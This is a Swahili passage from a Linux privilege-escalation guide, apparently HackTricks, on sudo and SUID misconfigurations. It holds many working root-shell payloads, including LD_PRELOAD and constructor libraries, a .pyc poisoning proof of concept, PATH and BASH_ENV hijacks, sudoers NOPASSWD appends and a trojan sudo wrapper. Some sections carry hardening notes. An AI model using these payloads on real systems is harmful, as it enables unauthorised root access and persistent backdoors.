Ruhusa ya sudo isiyo na vizuizi na yenye uwezo wa root kwa `prusaslicer` au `prusa-slicer` inastahili kukaguliwa ikiwa mpigaji anaweza kuchagua mradi wa `.3mf` utakaokatwa. Mradi unaweza kuwa na script ya baada ya uchakataji inayoendeshwa wakati G-code inapotolewa; miradi iliyoundwa kwa makusudi inaweza kutekeleza amri ndani ya PrusaSlicer hadi na kujumuisha toleo la 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Thibitisha kanuni halisi ya sudo, toleo la binary na viraka vya vendor, chanzo cha mradi, na kama njia husika ya utoaji huendeshwa kabla ya kuhitimisha kuwa mpaka wa ruhusa unaweza kufikiwa. Hoja isiyobadilika ya mradi au sera ya `NOEXEC` inayotumika inaweza kubadili matokeo. Kugundua tu kwamba slicer imesakinishwa hakuthibitishi njia ya privilege escalation.

### SETENV

Directive hii humruhusu mtumiaji **kuweka environment variable** wakati wa kutekeleza kitu:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Mfano huu, **uliotokana na mashine ya HTB Admirer**, ulikuwa **hatarini** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya Python wakati wa kuendesha script kama root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Poisoning ya `__pycache__` / `.pyc` inayoweza kuandikwa katika imports za Python zinazoruhusiwa na sudo

Ikiwa **script ya Python inayoruhusiwa na sudo** ina-import module ambayo saraka ya package yake ina **`__pycache__` inayoweza kuandikwa**, huenda ukaweza kubadilisha `.pyc` iliyohifadhiwa na kupata utekelezaji wa code kama mtumiaji mwenye ruhusa za juu wakati wa import inayofuata.<sup>[[30]](#references)</sup>

- Kwa nini inafanya kazi:
  - CPython huhifadhi bytecode cache kwenye `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter hukagua **header** (magic + metadata ya timestamp/hash iliyounganishwa na source), kisha hutekeleza code object ya marshaled iliyohifadhiwa baada ya header hiyo.
  - Ikiwa unaweza **kufuta na kuunda upya** faili ya cache kwa sababu saraka inaweza kuandikwa, unaweza kubadilisha `.pyc` inayomilikiwa na root lakini ambayo huwezi kuiandika moja kwa moja.
- Njia ya kawaida:
  - `sudo -l` inaonyesha script au wrapper ya Python unayoweza kuendesha kama root.
  - Script hiyo ina-import module ya ndani kutoka `/opt/app/`, `/usr/local/lib/...`, n.k.
  - Saraka ya `__pycache__` ya module iliyo-importiwa inaweza kuandikwa na mtumiaji wako au na kila mtu.

Ukaguzi wa haraka:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ikiwa unaweza kukagua script yenye mapendeleo ya juu, tambua moduli zilizoingizwa na njia ya cache:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Mtiririko wa kutumia vibaya:

1. Endesha script inayoruhusiwa na sudo mara moja ili Python iunde faili halali ya cache ikiwa bado haipo.
2. Soma baiti 16 za kwanza kutoka kwenye `.pyc` halali na uzitumie tena kwenye faili iliyoharibiwa.
3. Compile code object ya payload, tumia `marshal.dumps(...)` kuibadilisha, futa faili asilia ya cache, kisha uliunde upya kwa kutumia header asilia pamoja na bytecode yako hasidi.
4. Endesha tena script inayoruhusiwa na sudo ili import itekeleze payload yako kama root.

Vidokezo muhimu:

- Kutumia tena header asilia ni muhimu kwa sababu Python hukagua metadata ya cache dhidi ya faili chanzo, si kama mwili wa bytecode unalingana kweli na chanzo.
- Hii ni muhimu hasa ikiwa faili chanzo inamilikiwa na root na haiwezi kuandikwa, lakini saraka ya `__pycache__` iliyomo inaweza kuandikwa.
- `PYTHONDONTWRITEBYTECODE=1` na `python -B` huzuia Python kuandika faili mpya za `.pyc`; **hazimzuii** kupakia cache iliyopo na iliyo halali, ambayo mshambuliaji ameibadilisha. Kizuizi muhimu ni kama mtumiaji mwenye ruhusa za chini anaweza kubadilisha cache ambayo import yenye ruhusa za juu itakubali. Python hukagua metadata ya timestamp/size au hash kabla ya kupakia bytecode iliyohifadhiwa kwenye cache. Tazama [marejeleo ya import ya Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) na [nyaraka za mstari wa amri](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Muundo mdogo wa proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Uimarishaji:

- Hakikisha hakuna saraka katika njia ya uingizaji ya Python yenye upendeleo iliyoandikika na watumiaji wenye upendeleo mdogo, ikijumuisha `__pycache__`.
- Kagua umiliki na ruhusa za saraka za cache, pamoja na faili zilizopo za `.pyc`. Kuzima uandishi wa bytecode kunaweza kupunguza uundaji wa cache mpya, lakini hakufanyi cache iliyopo na inayoweza kubadilishwa isiwe hatari.
- Chukulia moduli za Python za ndani zinazoweza kuandikwa na saraka za cache zinazoweza kuandikwa kama unavyochukulia shell scripts au shared libraries zinazotekelezwa na root.

### BASH_ENV iliyohifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers itahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya Bash ya kuanzisha shell zisizoingiliana ili kutekeleza msimbo wowote kama root unapotekeleza amri iliyoruhusiwa.<sup>[[24]](#references)</sup>

- Kwa nini inafanya kazi: Kwa shell zisizoingiliana, Bash hutathmini `$BASH_ENV` na kuendesha faili hiyo kabla ya kuendesha script inayolengwa. Sheria nyingi za sudo huruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imehifadhiwa na sudo, faili yako huendeshwa ikiwa na upendeleo wa root.<sup>[[23]](#references)</sup>

- Mahitaji:
  - Sheria ya sudo unayoweza kutumia (lengo lolote linaloanzisha `/bin/bash` bila kuingiliana, au bash script yoyote).
  - `BASH_ENV` iwepo kwenye `env_keep` (angalia kwa `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Uimarishaji wa usalama:
  - Ondoa `BASH_ENV` (na `ENV`) kwenye `env_keep`; pendelea `env_reset`.
  - Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
  - Fikiria kuweka I/O logging ya sudo na arifa wakati env vars zilizohifadhiwa zinapotumika.

### Terraform kupitia sudo huku HOME ikihifadhiwa (!env_reset)

Sudo inaporuhusu kutumia Terraform kama mtumiaji mwenye mamlaka zaidi, `!env_reset` ni ishara ya kuangalia ni environment variables zipi hasa zinabaki kwa sheria hiyo mahususi. Thibitisha `HOME` au `TF_CLI_CONFIG_FILE` inayotumika kabla ya kuchukulia `.terraformrc` au `terraform.rc` inayoweza kuandikwa na mtumiaji anayepiga amri kuwa ndiyo usanidi wa CLI unaotumika. Ingizo la `provider_installation.dev_overrides` lina umuhimu tu ikiwa amri maalum ya Terraform inapakia provider hiyo na mtumiaji anayepiga amri anaweza kuweka executable yake kwenye saraka iliyochaguliwa.<sup>[[25]](#references)</sup>

- Elekeza provider inayohitajika kwenye saraka inayoweza kuandikwa, kisha weka plugin hasidi iliyopewa jina la provider (kwa mfano, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform itashindwa kukamilisha Go plugin handshake lakini itatekeleza payload kama root kabla haijaanguka, na kuacha SUID shell.

### TF_VAR overrides + bypass ya uthibitishaji wa symlink

Vigezo vya Terraform vinaweza kutolewa kupitia environment variables za `TF_VAR_<name>` ikiwa sheria husika ya sudo inazihifadhi. Kusoma kupitia source symlink pia kunahitaji provider inayofuata link na kunakili matokeo yaliyolindwa hadi kwenye destination inayoweza kusomwa na caller. Kuandika kupitia destination symlink, kwa upande mwingine, kunahitaji entry ya destination inayodhibitiwa na caller na provider yenye priviliji inayofuata link wakati wa kuandika; job iliyopangwa baadaye ni mojawapo tu ya matokeo yanayoweza kutokea. Kagua ruhusa halisi ya sudo, faili husika za `.tf`, CLI config iliyochaguliwa, na umiliki wa paths kwa kutumia amri za kusoma pekee kama `sudo -l`, `stat`, na `readlink` kabla ya kujaribu njia yoyote kati ya hizi. Validations dhaifu za kisintaksia kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` hazitatui symlinks:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform hutatua symlink na kunakili `/root/root.txt` halisi hadi kwenye eneo lengwa linaloweza kusomwa na mshambuliaji. Mbinu hii pia inaweza kutumiwa **kuandika** kwenye njia zenye marupurupu kwa kuunda mapema symlink za maeneo lengwa (kwa mfano, kuelekeza njia ya eneo lengwa la provider ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Katika baadhi ya distributions za zamani, sudo inaweza kusanidiwa kwa `requiretty`, ambayo hulazimisha sudo iendeshwe tu kutoka kwenye TTY ya mwingiliano. Ikiwa `!requiretty` imewekwa (au chaguo hilo halipo), sudo inaweza kutekelezwa kutoka kwenye miktadha isiyo ya mwingiliano, kama vile reverse shells, cron jobs, au scripts.

```bash
Defaults !requiretty
```

Hii si dosari ya moja kwa moja yenyewe, lakini inaongeza hali ambazo sheria za sudo zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / secure_path isiyo salama → utekaji wa PATH

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` yenye maingizo yanayoweza kuandikwa na mshambulizi (k.m., `/home/<user>/bin`), amri ya nje isiyo na njia kamili ndani ya lengwa linaloruhusiwa na sudo inaweza kufunikwa na nyingine.<sup>[[3]](#references)</sup> Kutokuwepo kwa `secure_path` inayotumika pia kunastahili kuchunguzwa **ikiwa** mazingira ya sudo ya amri yanahifadhi `PATH` inayodhibitiwa na mtumiaji anayeiita; kutokuwepo kwake pekee hakuthibitishi hilo. Soma script iliyoruhusiwa bila kuiendesha, kisha thibitisha kanuni halisi ya RunAs na hoja, njia bora ya kutafuta amri, na saraka inayoweza kuandikwa na kupitiwa iliyo kabla ya nyingine na iliyo na jina la amri. Uthibitishaji, `NOEXEC`, shell builtins na njia kamili za amri vinaweza kubadilisha matokeo.

- Mahitaji: kanuni ya sudo (mara nyingi `NOPASSWD`) inayoendesha script/binary inayotumia amri bila njia kamili (`free`, `df`, `ps`, n.k.) na ingizo la PATH linaloweza kuandikwa ambalo hutafutwa kwanza.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Kukwepa njia za utekelezaji wa Sudo
**Ruka** ili kusoma faili nyingine au kutumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Amri ya sudo/Binary ya SUID bila njia ya amri

Ikiwa **ruhusa ya sudo** imetolewa kwa amri moja **bila kubainisha njia**: _hacker10 ALL= (root) less_ unaweza kufanya exploit kwa kubadilisha kigezo cha PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inatekeleza amri nyingine bila kubainisha njia yake (kila mara angalia maudhui ya binary ya SUID isiyo ya kawaida kwa kutumia** _**strings**_ **)**.

[Mifano ya payload za kutekeleza.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binary ya SUID yenye njia ya amri

Ikiwa binary ya **suid** **inatekeleza amri nyingine kwa kubainisha njia yake**, basi unaweza kujaribu **ku-export function** iliyopewa jina la amri inayoitwa na faili ya suid.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function na ku-export:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Kisha, unapoiita binary ya suid, function hii itatekelezwa

### Wrapper maalum za kunakili za SUID

Utility inayomilikiwa na root na yenye SUID, inayokubali njia za chanzo na lengwa, inaweza kuvuka mipaka miwili tofauti ya uaminifu. Ikiunda shell command kutokana na mojawapo ya argument hizo (kwa mfano, kupitisha command ya `cp` iliyoundwa kwa `system()`), shell metacharacters zinaweza kutekeleza command nyingine kwa privileges zake za effective. Hata ikiendesha `cp` kwa usalama bila shell, lengwa lisilozuiliwa linaweza kuruhusu kuandika faili yoyote kwa privileges za juu, kama vile `/etc/passwd`. Kagua jinsi wrapper inavyoshughulikia argument, tabia yake ya effective UID, vizuizi vya lengwa, na kama faili inayonakiliwa huhifadhi maudhui yaliyodhibitiwa na caller; kosa la kawaida la `cp` au SUID bit pekee havithibitishi mojawapo ya hali hizo. Kagua binary na permissions zake bila kuitekeleza kabla ya majaribio yoyote ya mikono.

### Script inayoweza kuandikwa na kutekelezwa na wrapper ya SUID

Tatizo la kawaida katika usanidi usio sahihi wa custom app ni binary wrapper inayomilikiwa na root na yenye SUID, inayotekeleza script ambayo watumiaji wenye privileges za chini wanaweza kuiandika.

Mfumo wa kawaida:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Ikiwa `/usr/local/bin/backup.sh` ina ruhusa ya kuandikwa, unaweza kuongeza amri za payload kisha utekeleze wrapper ya SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Ukaguzi wa haraka:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Njia hii ya mashambulizi ni ya kawaida hasa katika wrappers za "maintenance"/"backup" zinazosambazwa ndani ya `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** hutumika kubainisha maktaba moja au zaidi za shared (.so files) ambazo loader itapakia kabla ya nyingine zote, ikiwemo maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama kupakia maktaba mapema.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia matumizi mabaya ya kipengele hiki, hasa kwa executables za **suid/sgid**, mfumo hutekeleza masharti fulani:

- Loader hupuuza **LD_PRELOAD** kwa executables ambazo real user ID (_ruid_) hailingani na effective user ID (_euid_).
- Kwa executables za suid/sgid, ni maktaba zilizo katika paths za kawaida ambazo pia ni suid/sgid pekee zinazopakiwa mapema.

Privilege escalation inaweza kutokea ikiwa unaweza kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha kauli **env_keep+=LD_PRELOAD**. Usanidi huu huruhusu kigezo cha mazingira **LD_PRELOAD** kubaki na kutambuliwa hata amri zinapoendeshwa kwa kutumia `sudo`, hali inayoweza kusababisha utekelezaji wa msimbo wowote wenye privileges zilizoinuliwa.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Hifadhi kama **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Kisha **compile** kwa kutumia:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Hatimaye, **pandisha haki za ufikiaji** kwa kuendesha

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti kigezo cha mazingira **LD_LIBRARY_PATH**, kwa sababu anadhibiti njia ambayo maktaba zitatumika kutafutwa.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** inayoonekana isiyo ya kawaida, ni vyema kuthibitisha ikiwa inapakia faili za **.so** ipasavyo. Unaweza kukagua hili kwa kutekeleza amri ifuatayo:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaashiria uwezekano wa kuitumia vibaya.

Ili kuitumia vibaya, mtu angeunda faili la C, tuseme _"/path/to/.config/libcalc.c"_, lenye msimbo ufuatao:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Msimbo huu, ukishakusanywa na kutekelezwa, unalenga kufanya privilege escalation kwa kubadilisha ruhusa za faili na kuendesha shell yenye priviliji zilizoinuliwa.

Kusanya faili ya C iliyo hapo juu kuwa faili ya shared object (.so) kwa kutumia:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Hatimaye, kuendesha binary ya SUID iliyoathiriwa kunapaswa kuanzisha exploit, na hivyo kuruhusu uwezekano wa mfumo kuathiriwa.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Sasa kwa kuwa tumepata binary ya SUID inayopakia library kutoka kwenye folda tunayo ruhusa ya kuandikia, hebu tuunde library kwenye folda hiyo kwa jina linalohitajika:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Ukipata hitilafu kama vile

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

hiyo ina maana kwamba library uliyotengeneza inahitaji kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyokusanywa ya Unix binaries ambazo mshambuliaji anaweza kutumia vibaya ili kukwepa vizuizi vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa, lakini kwa hali ambapo unaweza **kuingiza arguments pekee** kwenye command.

Mradi huu hukusanya kazi halali za Unix binaries ambazo zinaweza kutumiwa vibaya ili kutoka kwenye restricted shells, kuongeza au kudumisha privileges za juu, kuhamisha files, kuanzisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l`, unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inapata njia ya kutumia vibaya sudo rule yoyote.

### Kutumia Tena Sudo Tokens

Katika hali ambapo una **sudo access** lakini huna password, unaweza kuongeza privileges kwa **kusubiri command ya sudo itekelezwe kisha kuteka session token**.<sup>[[18]](#references)</sup>

Mahitaji ya kuongeza privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" **ametumia `sudo`** kutekeleza kitu ndani ya **dakika 15 zilizopita** (kwa chaguomsingi, huo ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza password yoyote)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kuwasha `ptrace_scope` kwa muda kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kuhariri `/etc/sysctl.d/10-ptrace.conf` kabisa na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yametimizwa, **unaweza kuongeza privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit ya kwanza** (`exploit.sh`) itaunda binary `activate_sudo_token` ndani ya _/tmp_. Unaweza kuitumia **kuwasha sudo token katika session yako** (hutapata root shell moja kwa moja; endesha `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Exploit ya pili** (`exploit_v2.sh`) itaunda shell ya sh ndani ya _/tmp_ **inayomilikiwa na root na yenye setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **exploit ya tatu** (`exploit_v3.sh`) **itaunda faili la sudoers** litakalofanya **sudo tokens ziwe za kudumu na kuruhusu watumiaji wote kutumia sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Ikiwa una **ruhusa za kuandika** kwenye folda au kwenye faili zozote zilizoundwa ndani ya folda hiyo, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kubadilisha faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo yenye PID 1234, unaweza **kupata sudo privileges** bila kuhitaji kujua nenosiri kwa kufanya:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` husanidi nani anayeweza kutumia `sudo` na jinsi ya kuitumia. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kikundi root**.\
**Ikiwa** unaweza **kusoma** faili hii, unaweza **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** kwenye faili yoyote, utaweza **kuongeza marupurupu**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Njia nyingine ya kutumia vibaya ruhusa hizi:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Kuna baadhi ya mbadala wa binary ya `sudo`, kama vile `doas` ya OpenBSD. Kumbuka kuangalia usanidi wake katika `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Ikiwa doas inaruhusu kihariri au interpreter, angalia mbinu za escape za mtindo wa GTFOBins:

```bash
doas vim
:!/bin/sh
```

Sheria ya `doas` yenye uwezo wa root kwa `dstat` ya awali inayotumia Python pia inastahili ukaguzi wa njia za plugin. [Mwongozo wake](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) na [msimbo wake](https://github.com/dstat-real/dstat/blob/master/dstat) zinaorodhesha `/usr/share/dstat/` na `/usr/local/share/dstat/` miongoni mwa maeneo ya plugin za `dstat_*.py`. Ikiwa mtumiaji wa sasa anaweza kuandika na kutafuta kwenye eneo linalotumiwa kweli na build iliyosakinishwa, plugin iliyochaguliwa inaweza kuendeshwa kwa utambulisho wa RunAs wa `doas`. Thibitisha sheria inayotumika, jinsi build hiyo inavyotafuta plugin, ruhusa au ACL za saraka na saraka zake za juu, na kama mtumiaji anayeita amri anaweza kuchagua plugin; sheria ya `dstat` au saraka inayoweza kuandikwa pekee ni dalili tu. Utekelezaji mwingine wa `dstat` unaweza kutumia mifumo tofauti ya plugin. Kagua metadata bila kupakia plugin.

### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida huunganisha kwenye mashine na hutumia `sudo`** ili kuongeza ruhusa, na umepata shell katika muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** itakayoendesha msimbo wako kama root kisha kutekeleza amri ya mtumiaji. Kisha, **rekebisha $PATH** ya muktadha wa mtumiaji (kwa mfano, kwa kuongeza njia mpya kwenye .bash_profile) ili mtumiaji anapoendesha sudo, executable yako ya sudo iendeshwe.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash), utahitaji kurekebisha faili nyingine ili kuongeza njia mpya. Kwa mfano, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hurekebisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine kwenye [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama hiki:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Maktaba ya Pamoja

### ld.so

Faili `/etc/ld.so.conf` huonyesha **faili za usanidi zilizopakiwa zinatoka wapi**. Kwa kawaida, faili hii huwa na path ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kuwa faili za usanidi zilizo katika `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **huelekeza kwenye folda nyingine** ambamo **maktaba** zita**tafutwa**. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu yoyote **mtumiaji ana ruhusa za kuandika** kwenye path yoyote kati ya hizi: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyotajwa kwenye faili ya usanidi iliyo ndani ya `/etc/ld.so.conf.d/*.conf`, anaweza kuongeza privileges.\
Tazama **jinsi ya ku-exploit usanidi huu usio sahihi** kwenye ukurasa ufuatao:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Kwa kunakili lib kwenye `/var/tmp/flag15/`, programu itaitumia kutoka eneo hilo kama ilivyobainishwa kwenye kigezo cha `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Kisha unda maktaba hasidi katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
